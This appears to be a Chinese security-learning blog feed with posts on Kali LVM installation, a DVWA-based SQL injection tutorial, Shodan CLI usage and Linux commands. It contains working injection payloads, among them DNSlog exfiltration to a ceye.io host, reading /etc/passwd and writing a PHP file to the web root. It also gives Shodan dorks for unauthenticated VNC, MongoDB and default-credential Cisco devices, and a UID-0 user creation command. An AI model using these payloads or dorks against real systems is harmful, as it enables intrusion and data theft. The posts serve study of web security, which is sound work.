        <content type="html"><![CDATA[<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="kali安装到硬盘问题"><a href="#kali安装到硬盘问题" class="headerlink" title="kali安装到硬盘问题"></a>kali安装到硬盘问题</h2><h3 id="遇到的问题：电脑里有两块硬盘，想要都做成kali的盘"><a href="#遇到的问题：电脑里有两块硬盘，想要都做成kali的盘" class="headerlink" title="遇到的问题：电脑里有两块硬盘，想要都做成kali的盘"></a>遇到的问题：电脑里有两块硬盘，想要都做成kali的盘</h3><p>需要用到：卷组，逻辑卷的知识</p><p>在安装kali时就配置好：</p><p>例如遇到这种情况：</p><p><img src="/0928kali-diao-you/image-20220928153101661.png" alt="image-20220928153101661"></p><p>我们有两个硬盘sda和sdb</p><p>在分区向导里选择这一项：</p><p><img src="/0928kali-diao-you/image-20220928153250327.png" alt="image-20220928153250327"></p><p>会显示有几个盘（你有几个硬盘就会显示几个）：</p><p><img src="/0928kali-diao-you/image-20220928153350292.png" alt="image-20220928153350292"></p><p>随便选一个就行</p><p>然后无脑下一步，直到：</p><p><img src="/0928kali-diao-you/image-20220928153514321.png" alt="image-20220928153514321"></p><p>选择是，然后继续无脑下一步，直到：</p><p><img src="/0928kali-diao-you/image-20220928153621683.png" alt="image-20220928153621683"></p><p>我们可以看到sda已经分好了，但是sdb没动，双击sdb创建新的分区表，会变成：</p><p><img src="/0928kali-diao-you/image-20220928153823475.png" alt="image-20220928153823475"></p><p>如果你也出现类似这样的东西，那你离成功不远了，接着点这里（选择 “是” ）：</p><p><img src="/0928kali-diao-you/image-20220928153927689.png" alt="image-20220928153927689"></p><p>然后点击扩展卷组</p><p><img src="/0928kali-diao-you/image-20220928154259201.png" alt="image-20220928154259201"></p><p>没得选，点继续出现这个页面：</p><p><img src="/0928kali-diao-you/image-20220928154352867.png" alt="image-20220928154352867"></p><p>把这个sdb选上，也就是你的第二块硬盘，然后继续，点 “是”，</p><p>然后选择”删除逻辑卷”,</p><p><img src="/0928kali-diao-you/image-20220928154554924.png" alt="image-20220928154554924"></p><p>把root这个逻辑卷删掉：</p><p><img src="/0928kali-diao-you/image-20220928154702704.png" alt="image-20220928154702704"></p><p>然后“创建逻辑卷”，逻辑卷的名称就还是叫“root”，一直下一步就好了，回到这一页：</p><p><img src="/0928kali-diao-you/image-20220928155018177.png" alt="image-20220928155018177"></p><p>双击这里：</p><p><img src="/0928kali-diao-you/image-20220928155055942.png" alt="image-20220928155055942"></p><p>把它  用于：Ext4 日志文件系统 挂载点：&#x2F;根目录  就像这样：</p><p><img src="/0928kali-diao-you/image-20220928155236780.png" alt="image-20220928155236780"></p><p>然后分区设定结束，就完成了</p><p>然后<img src="/0928kali-diao-you/image-20220928155429831.png" alt="image-20220928155429831"></p><p>就行了</p><h2 id="gnome插件"><a href="#gnome插件" class="headerlink" title="gnome插件"></a>gnome插件</h2><p>访问网站：<a href="https://extensions.gnome.org/">https://extensions.gnome.org/</a></p><pre class=" language-shell"><code class="language-shell">Compiz alike magic lamp effect #优化窗口最小化，仿macClipboard Indicator #剪贴板功能Coverflow Alt-Tab #优化窗口切换NetSpeed #显示网速OpenWeather #天气小插件</code></pre><h2 id="软件链接"><a href="#软件链接" class="headerlink" title="软件链接"></a>软件链接</h2><pre class=" language-shell"><code class="language-shell">洛雪音乐            https://github.com/lyswhut/lx-music-desktop星火应用商店   https://www.spark-app.store/download新立得软件包管理器 apt install synaptictypora(旧的免费版)https://pan.baidu.com/s/15gSv-dyOs1DIo3NHt5e7HA?pwd=rat7</code></pre><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h2><p>第一次登录上的是普通用户权限，后期就算一直用root权限，也别删这个普通用户，有些软件没这个普通用户真不行</p><h3 id="JetBrains插件"><a href="#JetBrains插件" class="headerlink" title="JetBrains插件:"></a>JetBrains插件:</h3><pre class=" language-shell"><code class="language-shell">atom material iconschinesecodeglance promaterialnyan progress barrainbow brackets</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 调优 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/0825sql-zhu-ru/"/>
      <url>/0825sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><em><strong>攻击者传入恶意的sql语句，从而产生歧义</strong></em></p><p>用dvwa做简单实验环境</p><p><em><strong>注意事项</strong></em><em><strong>1&gt; sql注入时的注释符#在URL中会被重新编码，所以在URL中注释时使用–+</strong></em></p><h2 id="显注-问什么答什么"><a href="#显注-问什么答什么" class="headerlink" title="显注(问什么答什么)"></a>显注(问什么答什么)</h2><p>形成原因，未对用户的输入进行过滤</p><p>Eg:</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'$id'</span><span class="token punctuation">;</span></code></pre><p>用户输入的会当成 ‘$id’ 传入数据库查询</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#正常用户输入</span><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">#';#恶意用户，然而依然可以查询出数据</span></code></pre><h3 id="判断："><a href="#判断：" class="headerlink" title="判断："></a>判断：</h3><p>​显注 1’ 返回sql报错</p><h3 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h3><p>​判断字段数量 order by 1 2 3</p><p>​拼写语句，查找基础信息 databases() user() …</p><p>​跨库： 库名 –&gt; tables –&gt; 列名</p><p>​最终目的： union查询数据，并且可以查询到web页面</p><h3 id="拖数据"><a href="#拖数据" class="headerlink" title="拖数据"></a>拖数据</h3><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span></code></pre><p>​</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="盲注（布尔型）（只返回对错）："><a href="#盲注（布尔型）（只返回对错）：" class="headerlink" title="盲注（布尔型）（只返回对错）："></a>盲注（布尔型）（只返回对错）：</h3><h4 id="判定："><a href="#判定：" class="headerlink" title="判定："></a>判定：</h4><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token comment" spellcheck="true">#1</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">##2</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">##3</span></code></pre><p>若#1，#2的payload返回结果一致，并且与#3的payload返回结果不一致即存在sql注入</p><h4 id="攻击：-1"><a href="#攻击：-1" class="headerlink" title="攻击："></a>攻击：</h4><p>​判断字段数量 order by 1 2 3</p><p>​判断实际内容：长度（length）–&gt;一个一个字母判断（substring）</p><p>​数据：库名 –&gt;tables–&gt; 列名 </p><h3 id="盲注（时间型）（根据响应的时间）："><a href="#盲注（时间型）（根据响应的时间）：" class="headerlink" title="盲注（时间型）（根据响应的时间）："></a>盲注（时间型）（根据响应的时间）：</h3><h4 id="判断：-1"><a href="#判断：-1" class="headerlink" title="判断："></a>判断：</h4><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">##如果有注入则会等待10秒钟再返回数据</span></code></pre><p>带入数据库的语句：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#';</span></code></pre><p>这个payload，盲注，显注都可以打</p><h3 id="拖数据-1"><a href="#拖数据-1" class="headerlink" title="拖数据"></a>拖数据</h3><p>一个一个试：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and substring(database(),1,1)='</span><span class="token number">d</span>' <span class="token comment" spellcheck="true">##布尔</span><span class="token number">1</span><span class="token string">' and if(substring(database(),1,1)='</span><span class="token number">d</span>'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">##时间 猜对卡顿10s,否则直接返回</span></code></pre><h2 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h2><h3 id="登录框"><a href="#登录框" class="headerlink" title="登录框"></a>登录框</h3><pre class=" language-sql"><code class="language-sql">$sql<span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre><h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p>作用：把盲注变成显注，更快</p><p>条件：只能是Windows系统的mysql</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span></code></pre><p><img src="/0825sql-zhu-ru/image-20220825125428279.png" alt="image-20220825125428279"></p><p>用法</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.nxxjv1.ceye.io\\AB'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/0825sql-zhu-ru/image-20220825125805990.png" alt="image-20220825125805990"></p><p>然后查看</p><p><img src="/0825sql-zhu-ru/image-20220825125937033.png" alt="image-20220825125937033"></p><p>payload:</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and 1=2 union select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.nxxjv1.ceye.io\\AB'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">##查数据库名称</span></code></pre><h2 id="做事"><a href="#做事" class="headerlink" title="做事"></a>做事</h2><h3 id="读取系统文件-load-file"><a href="#读取系统文件-load-file" class="headerlink" title="读取系统文件(load_file())"></a>读取系统文件(load_file())</h3><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and 1=2 union select 2,load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">##读文件</span></code></pre><p><img src="/0825sql-zhu-ru/image-20220825131541472.png" alt="image-20220825131541472"></p><h3 id="写入文件-into-outfile"><a href="#写入文件-into-outfile" class="headerlink" title="写入文件(into outfile)"></a>写入文件(into outfile)</h3><p>得有写的权限</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and 1=2 union select 2,'</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>?<span class="token operator">></span><span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>dvwaplus<span class="token operator">/</span>p<span class="token punctuation">.</span>php'<span class="token comment" spellcheck="true">#</span></code></pre><p>得提前知道网站的目录</p><p><img src="/0825sql-zhu-ru/image-20220825132656256.png" alt="image-20220825132656256"></p><h2 id="小taps"><a href="#小taps" class="headerlink" title="小taps"></a>小taps</h2><h3 id="mysql中存放库名"><a href="#mysql中存放库名" class="headerlink" title="mysql中存放库名"></a>mysql中存放库名</h3><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span></code></pre><p><img src="/0825sql-zhu-ru/image-20220825134434188.png" alt="image-20220825134434188"></p><h3 id="根据库名查表名"><a href="#根据库名查表名" class="headerlink" title="根据库名查表名"></a>根据库名查表名</h3><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#以dvwa举例子</span></code></pre><p><img src="/0825sql-zhu-ru/image-20220825134636719.png" alt="image-20220825134636719"></p><h3 id="检测存在SQL的闭合语法"><a href="#检测存在SQL的闭合语法" class="headerlink" title="检测存在SQL的闭合语法"></a>检测存在SQL的闭合语法</h3><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'1"1'</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token string">")1'))1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只要有sql报错或异常则异常的那个则为闭合语法</p><p>用brup的intruder爆破找异常，然后一个一个试异常的</p><h3 id="天选payload-sleep"><a href="#天选payload-sleep" class="headerlink" title="天选payload(sleep)"></a>天选payload(sleep)</h3><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">##时间是真的好用，随时随地都OK，，，除非网站屏蔽关键字</span></code></pre><h3 id="最后贴一张图"><a href="#最后贴一张图" class="headerlink" title="最后贴一张图"></a>最后贴一张图</h3><p><img src="/0825sql-zhu-ru/image-20220822154502818.png" alt="image-20220822154502818"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shodan使用</title>
      <link href="/0724shodan-shi-yong/"/>
      <url>/0724shodan-shi-yong/</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class=" language-shell"><code class="language-shell">pip3 install shodan</code></pre><h3 id="登录自己的key"><a href="#登录自己的key" class="headerlink" title="登录自己的key"></a>登录自己的key</h3><pre class=" language-shell"><code class="language-shell">shodan init <YOUR KEY></code></pre><h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><p>官方：<a href="https://www.shodan.io/search/filters">https://www.shodan.io/search/filters</a></p><h4 id="个人信息-info"><a href="#个人信息-info" class="headerlink" title="个人信息(info)"></a>个人信息(info)</h4><pre class=" language-shell"><code class="language-shell">shodan info#查看api调用剩余情况</code></pre><p><img src="/0724shodan-shi-yong/image-20220724164736969.png" alt="image-20220724164736969"></p><h4 id="搜索-search"><a href="#搜索-search" class="headerlink" title="搜索(search)"></a>搜索(search)</h4><pre class=" language-shell"><code class="language-shell">#搜索资产内容has_vuln:True#有漏洞'"\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00"'#CVE-2019-0708"authentication disabled" port 5900#VNC空密码http.title:hacked by#被挂黑页的网站#网站title里有***的http.title:后台"cisco -authorized" port:23#思科telnet连接u:admin/cisco p:cisconet:192.144.229.80#net:+一个网段http.waf:Safedog#被***保护的网站http.html:login#html里有***关键字的网站"MongoDB Server Information -authentication" port:27017#MongoDB不用身份认证的ip #-authentication意思是减去身份认证port:50050 country:cn#cs的服务器</code></pre><pre class=" language-shell"><code class="language-shell">shodan search -h</code></pre><p><img src="/0724shodan-shi-yong/image-20220724164404864.png" alt="image-20220724164404864"></p><pre class=" language-shell"><code class="language-shell">--limit#查询几条数据，跟数字</code></pre><pre class=" language-shell"><code class="language-shell">--fields#查询的是什么，跟资产类容，Eg:ip_str,port</code></pre><p>Eg (搜索10条windows7的资产) :</p><pre class=" language-shell"><code class="language-shell">shodan search --limit 10 --fields ip_str,port os:windows 7 > 1.txt</code></pre><p><img src="/0724shodan-shi-yong/image-20220724165446900.png" alt="image-20220724165446900"></p><h4 id="查某个ip的详细信息-host"><a href="#查某个ip的详细信息-host" class="headerlink" title="查某个ip的详细信息(host)"></a>查某个ip的详细信息(host)</h4><pre class=" language-shell"><code class="language-shell">shodan host -h</code></pre><p><img src="/0724shodan-shi-yong/image-20220724165956010.png" alt="image-20220724165956010"></p><pre class=" language-shell"><code class="language-shell">--history#shodan的历史解析记录</code></pre><p>Eg1:</p><pre class=" language-shell"><code class="language-shell">shodan host 192.144.229.80</code></pre><p><img src="/0724shodan-shi-yong/image-20220724170604800.png" alt="image-20220724170604800"></p><p>Eg2:</p><pre class=" language-shell"><code class="language-shell">shodan host 192.144.229.80 --history</code></pre><p><img src="/0724shodan-shi-yong/image-20220724170811478.png" alt="image-20220724170811478"></p><h4 id="下载-download"><a href="#下载-download" class="headerlink" title="下载(download)"></a>下载(download)</h4><pre class=" language-shell"><code class="language-shell">shodan dowdload -h</code></pre><p><img src="/0724shodan-shi-yong/image-20220724171817322.png" alt="image-20220724171817322"></p><pre class=" language-shell"><code class="language-shell">--limit#查询几条数据，跟数字</code></pre><p>Eg:</p><pre class=" language-shell"><code class="language-shell">shodan download --limit 100 os:windows 7#下载100条win7的资产</code></pre><p><img src="/0724shodan-shi-yong/image-20220724172039610.png" alt="image-20220724172039610"></p><p>不要解压该文件或直接打开，用后文的parse解析</p><h4 id="解析-parse"><a href="#解析-parse" class="headerlink" title="解析(parse)"></a>解析(parse)</h4><pre class=" language-shell"><code class="language-shell">shodan parse -h</code></pre><p><img src="/0724shodan-shi-yong/image-20220724172458530.png" alt="image-20220724172458530"></p><pre class=" language-shell"><code class="language-shell">--fields#查询的是什么，跟资产类容，Eg:ip_str,port</code></pre><p>Eg:</p><pre class=" language-shell"><code class="language-shell">shodan parse --fields ip_str os\:windows.json.gz#解析上文download的文件</code></pre><p><img src="/0724shodan-shi-yong/image-20220724172701053.png" alt="image-20220724172701053"></p><h4 id="计数-count"><a href="#计数-count" class="headerlink" title="计数(count)"></a>计数(count)</h4><pre class=" language-shell"><code class="language-shell">shodan count os:windows 7#shodan自己数据库中存了多少win7系统的数据</code></pre><p><img src="/0724shodan-shi-yong/image-20220724173624927.png" alt="image-20220724173624927"></p><h4 id="蜜罐检测-honeyscore"><a href="#蜜罐检测-honeyscore" class="headerlink" title="蜜罐检测(honeyscore)"></a>蜜罐检测(honeyscore)</h4><pre class=" language-shell"><code class="language-shell">shodan honeyscore 192.144.229.80#判断192.144.229.80是不是蜜罐</code></pre><p><img src="/0724shodan-shi-yong/image-20220724174058810.png" alt="image-20220724174058810"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础命令</title>
      <link href="/0716linux-ji-chu-ming-ling/"/>
      <url>/0716linux-ji-chu-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>ls -l   l&#x3D;&#x3D;&gt;list</p><p>ls -a   a&#x3D;&#x3D;&gt;all</p><p>ls -h   h以习惯人查看的方式打开</p><h3 id="rm-删除"><a href="#rm-删除" class="headerlink" title="rm 删除"></a>rm 删除</h3><p>rm -rf   r&#x3D;&#x3D;&#x3D;&gt;  逐级删除</p><p>​ f&#x3D;&#x3D;&#x3D;&gt;   强制删除，不询问</p><h3 id="mkdir-创建文件夹"><a href="#mkdir-创建文件夹" class="headerlink" title="mkdir 创建文件夹"></a>mkdir 创建文件夹</h3><p>mkdir a b  同时创建a b两个文件夹</p><p>mkdir -p xx&#x2F;xxx 创建多级目录</p><h3 id="touch-创建文件"><a href="#touch-创建文件" class="headerlink" title="touch 创建文件"></a>touch 创建文件</h3><p>touch a.txt</p><h3 id="cp-复制"><a href="#cp-复制" class="headerlink" title="cp 复制"></a>cp 复制</h3><p>cp -r a&#x2F; &#x2F;tmp     r是递归复制，连着子目录和文件都复制</p><p>cp -p          p复制时连着文件所有权属性都复制过去</p><h3 id="mv-剪切，重命名"><a href="#mv-剪切，重命名" class="headerlink" title="mv 剪切，重命名"></a>mv 剪切，重命名</h3><p>mv a b  把a的文件名改为b</p><h3 id="读文件-cat-more-less"><a href="#读文件-cat-more-less" class="headerlink" title="读文件 cat more less"></a>读文件 cat more less</h3><h3 id="head-前几行"><a href="#head-前几行" class="headerlink" title="head 前几行"></a>head 前几行</h3><p>head -n 4   前4行内容</p><p>eg:</p><pre class=" language-shell"><code class="language-shell">cat /etc/passwd |head -n4  #读/etc/passwd的前4行</code></pre><h3 id="tail-后几行"><a href="#tail-后几行" class="headerlink" title="tail 后几行"></a>tail 后几行</h3><p>tail -n 3   后3行内容</p><p>eg:</p><pre class=" language-shell"><code class="language-shell">cat /etc/passwd |tail -n2  #读/etc/passwd的后2行</code></pre><p>tail 查看新增的内容</p><p>eg：</p><pre class=" language-shell"><code class="language-shell">tail -f /var/log/secure  #监控日志的变化情况</code></pre><p>与head配套使用</p><pre class=" language-shell"><code class="language-shell">cat /etc/passwd|head -n5|tail -n2 #读/etc/passwd的第4，5行</code></pre><h3 id="wc-统计"><a href="#wc-统计" class="headerlink" title="wc 统计"></a>wc 统计</h3><pre class=" language-shell"><code class="language-shell">wc -l /etc/passwd   #统计/etc/passwd有多少行wc -c /etc/passwd   #统计/etc/passwd有多少Byteswc -w /etc/passwd   #统计/etc/passwd有多少字数</code></pre><h3 id="df-显示磁盘分区上有多少可用磁盘空间"><a href="#df-显示磁盘分区上有多少可用磁盘空间" class="headerlink" title="df 显示磁盘分区上有多少可用磁盘空间"></a>df 显示磁盘分区上有多少可用磁盘空间</h3><pre class=" language-shell"><code class="language-shell">df -h  #-h以好理解的方式显示大小</code></pre><h3 id="vi-编辑器"><a href="#vi-编辑器" class="headerlink" title="vi 编辑器"></a>vi 编辑器</h3><p>命令模式：</p><pre class=" language-shell"><code class="language-shell">w         # 保存 writeq         # 退出 quitwq        # 保存并退出q!        # 不保存强制退出set nu    # 显示行号wq!       # 强制保存并退出</code></pre><p>一般模式：</p><pre class=" language-shell"><code class="language-shell">/hello             # 搜索“hello”内容gg                 # 光标立马回到第一行2                  # 光标向下跳2行，以此类推G                  # 移动到最后一行dd                 # 删除当前行</code></pre><h3 id="useradd-建立新用户"><a href="#useradd-建立新用户" class="headerlink" title="useradd   建立新用户"></a>useradd   建立新用户</h3><pre class=" language-shell"><code class="language-shell">useradd nq#创建nq用户useradd -o -u 0 nq#创建uid为0的nq用户useradd nq -g nqg#创建nq用户并且添加到nqg用户组</code></pre><h3 id="groupadd新建用户组"><a href="#groupadd新建用户组" class="headerlink" title="groupadd新建用户组"></a>groupadd新建用户组</h3><pre class=" language-shell"><code class="language-shell">groupadd nqg#创建nqg的用户组</code></pre><h3 id="whoami我是谁"><a href="#whoami我是谁" class="headerlink" title="whoami我是谁"></a>whoami我是谁</h3><h3 id="chown设置文件所有者"><a href="#chown设置文件所有者" class="headerlink" title="chown设置文件所有者"></a>chown设置文件所有者</h3><pre class=" language-shell"><code class="language-shell">chown nq:nq 1.txt#把1.txt属主属组改为nq,nq1</code></pre><h3 id="chmod设置文件权限"><a href="#chmod设置文件权限" class="headerlink" title="chmod设置文件权限"></a>chmod设置文件权限</h3><pre class=" language-shell"><code class="language-shell">r#read 4w#write2x#执行   1 s#执行时用属主身份</code></pre><h3 id="top任务管理器"><a href="#top任务管理器" class="headerlink" title="top任务管理器"></a>top任务管理器</h3><h3 id="w查看有几个用户在登录着"><a href="#w查看有几个用户在登录着" class="headerlink" title="w查看有几个用户在登录着"></a>w查看有几个用户在登录着</h3><h3 id="ps查看进程"><a href="#ps查看进程" class="headerlink" title="ps查看进程"></a>ps查看进程</h3><pre class=" language-shell"><code class="language-shell">ps -aux#-a 显示当前终端的所有进程            #-u 显示进程的用户信息            #-x 显示所有程序，不以终端机来区分</code></pre><h3 id="netstat查看网络状态"><a href="#netstat查看网络状态" class="headerlink" title="netstat查看网络状态"></a>netstat查看网络状态</h3><pre class=" language-shell"><code class="language-shell">netstat -annetstat -anltp                    #-a：显示所有连线中的Socket；                    #-l：显示监控中的服务器的Socket；                    #-n：直接使用ip地址，而不通过域名服务器；                    #-t：显示TCP传输协议的连线状况；                    #-p：显示正在使用Socket的程序识别码和程序名称</code></pre><h3 id="lsof查进程打开的文件-恢复被删的日志"><a href="#lsof查进程打开的文件-恢复被删的日志" class="headerlink" title="lsof查进程打开的文件 恢复被删的日志"></a>lsof查进程打开的文件 恢复被删的日志</h3><pre class=" language-shell"><code class="language-shell">lsof 1.txt           #查看哪些进程打开了1.txt文件lsof -c sshd         #查看sshd服务所打开的文件lsof -i :22          #查看22端口有哪些进程在访问lsof -p 1168         #查看1168进程号所打开的文件lsof -u 0            #查看uid为0的用户打开的文件lsof|grep /var/log/  #查看/var/log/下的文件被哪些进程打开</code></pre><pre class=" language-shell"><code class="language-shell">rm -rf /var/log/messageslsof |grep /var/log/messages#记住pid号cd /proc/*pid*/fdls -l#找到要恢复的文件，记住前面的id号cp *id* /tmp</code></pre><h3 id="kill杀进程"><a href="#kill杀进程" class="headerlink" title="kill杀进程"></a>kill杀进程</h3><pre class=" language-shell"><code class="language-shell">kill -9 12321#-9是杀的力度，12321是进程号</code></pre><h3 id="which查命令的路径"><a href="#which查命令的路径" class="headerlink" title="which查命令的路径"></a>which查命令的路径</h3><pre class=" language-shell"><code class="language-shell">which ls#查ls命令的路径</code></pre><h3 id="xargs胶水"><a href="#xargs胶水" class="headerlink" title="xargs胶水"></a>xargs胶水</h3><pre class=" language-shell"><code class="language-shell">ls|xargs -n1 cat#-n1 一行一行的列出来                    #加上cat相当于把ls出来的文件名用cat遍历读</code></pre><h3 id="awk取某列"><a href="#awk取某列" class="headerlink" title="awk取某列"></a>awk取某列</h3><pre class=" language-shell"><code class="language-shell">cat /etc/passwd|awk -F ':' '&#123;print($1--$2)&#125;'  #-F ':' 以：为分隔符                                          #$1 取第1列                                                #$2 取第2列                                                #中间的-- 表示用--把这两列连起来cat /etc/passwd|awk -F ':' '&#123;print($NF)&#125;'#$NF表示最后一个</code></pre><h3 id="sed替换，删除，新增"><a href="#sed替换，删除，新增" class="headerlink" title="sed替换，删除，新增"></a>sed替换，删除，新增</h3><pre class=" language-shell"><code class="language-shell">#改cat passwd|sed 's/:/+/g'#ssearch查询                                            #： 所有的：                                            #+  改为+                                            #g  全文#增cat passwd|sed 's/^/nxm/g'#^  每行的开头#每行开头加上nxm                                            #$  每行的结尾#删cat passwd|sed '/^r/d'#d  删除#删除以r开头的行cat passwd|sed '/nologin$/d'#删除以nologin结尾的行cat passwd|sed '/^$/d'#删除所有的空白行                                            </code></pre><h3 id="grep-正则"><a href="#grep-正则" class="headerlink" title="grep 正则"></a>grep 正则</h3><pre class=" language-shell"><code class="language-shell">cat passwd |grep root                          # 只显示带有root关键字的行grep -v root passwd                            # 忽略匹配到的行cat passwd |grep -E "root|sshd"                # 包含多个可能性的行cat passwd |grep -E '^r'                       # 以r开头的行cat passwd |grep -E 'n$'                       # 以n结尾的行grep "passwd" /etc -rn                         # -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找cat passwd |grep -w :   # -w 精准匹配</code></pre><h3 id="find查文件名"><a href="#find查文件名" class="headerlink" title="find查文件名"></a>find查文件名</h3><pre class=" language-shell"><code class="language-shell">find / -name passwd#从/根目录查名字包含passwd的文件find / -type f#从/根目录查所有的文件 f:文件，d：目录find / -mtime -2#time代表天 m代表修改过#过去两天修改过的文件find / -amin -2#min代表分钟 a代表被访问过#过去两分钟被访问过的文件find / -cmin -2#c代表改过状态的文件（如，权限）</code></pre><h3 id="split切割文件"><a href="#split切割文件" class="headerlink" title="split切割文件"></a>split切割文件</h3><pre class=" language-shell"><code class="language-shell">split -b 100b passwd#-b 按文件大小切割                                    #-l 按行来切割</code></pre><h3 id="sort排序"><a href="#sort排序" class="headerlink" title="sort排序"></a>sort排序</h3><pre class=" language-shell"><code class="language-shell">sort -t#-t 按字典                                    #-n 按数字</code></pre><h3 id="uniq去重复"><a href="#uniq去重复" class="headerlink" title="uniq去重复"></a>uniq去重复</h3><p>一般排序后去重s</p><pre class=" language-shell"><code class="language-shell">uniq -c#统计重复</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础配置</title>
      <link href="/0716linux-ji-chu-pei-zhi/"/>
      <url>/0716linux-ji-chu-pei-zhi/</url>
      
